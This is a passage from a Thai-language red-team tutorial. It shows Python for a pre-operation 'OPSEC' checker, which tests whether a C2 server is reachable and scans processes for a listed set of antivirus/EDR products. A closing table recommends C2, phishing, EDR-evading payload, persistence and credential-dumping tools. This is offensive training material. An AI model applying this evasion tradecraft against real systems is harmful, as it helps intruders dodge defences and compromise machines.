    def check_c2_reachability(self, c2_host: str, c2_port: int = 443) -> bool:
        """ตรวจสอบว่า C2 เข้าถึงได้"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((c2_host, c2_port))
            sock.close()
            if result == 0:
                print(f"  [+] C2 reachable: {c2_host}:{c2_port}")
                return True
            else:
                print(f"  [-] C2 NOT reachable: {c2_host}:{c2_port}")
                return False
        except Exception as e:
            print(f"  [-] Error: {e}")
            return False
    
    def check_av_status(self) -> list:
        """ตรวจสอบ AV/EDR ที่รันอยู่"""
        av_processes = [
            'MsMpEng.exe', 'crowdstrike', 'cbdefense', 
            'cylanceprotect', 'sentinel_one', 'carbonblack'
        ]
        
        try:
            result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
            running = []
            for av in av_processes:
                if av.lower() in result.stdout.lower():
                    running.append(av)
                    print(f"  [!] AV/EDR detected: {av}")
            return running
        except Exception:
            return []
    
    def run_preop_checks(self) -> bool:
        """รัน pre-operation OPSEC checks ทั้งหมด"""
        print("\n[*] Running Pre-Operation OPSEC Checks...")
        print("=" * 50)
        
        all_passed = True
        
        print("[1] Checking VPN/Anonymity:")
        if not self.check_vpn():
            all_passed = False
        
        print("\n[2] Checking AV/EDR:")
        av_list = self.check_av_status()
        if av_list:
            print(f"  [!] {len(av_list)} AV/EDR products detected - adjust tactics")
        
        print("\n" + "=" * 50)
        if all_passed:
            print("[+] Pre-operation checks PASSED - proceed")
        else:
            print("[!] WARNING: Some checks failed - review before proceeding")
        
        return all_passed

if __name__ == "__main__":
    checker = OPSECChecker()
    checker.run_preop_checks()
```

---

## สรุป

| ด้าน | เครื่องมือ | ตัวเลือก |
|------|-----------|----------|
| C2 Framework | Sliver, Cobalt Strike, Havoc | Sliver (free), CS (paid) |
| Phishing | GoPhish, Evilginx2 | GoPhish (easy), Evilginx (advanced) |
| Payload | msfvenom, custom | Custom เลี่ยง EDR |
| Lateral | impacket suite, Cobalt Strike | impacket |
| Persistence | WMI, Registry, Services | WMI เลี่ยง detect |
| Credential | Mimikatz, pypykatz | pypykatz (บน Linux) |
| Pivoting | Chisel, ligolo-ng, Metasploit | ligolo-ng (modern) |
| Reporting | Custom + ATT&CK Navigator | |

---

← [Part 94: Active Directory Advanced](Part-94-Active-Directory-Advanced.md) | [Part 96: Threat Intelligence](Part-96-Threat-Intelligence.md) →
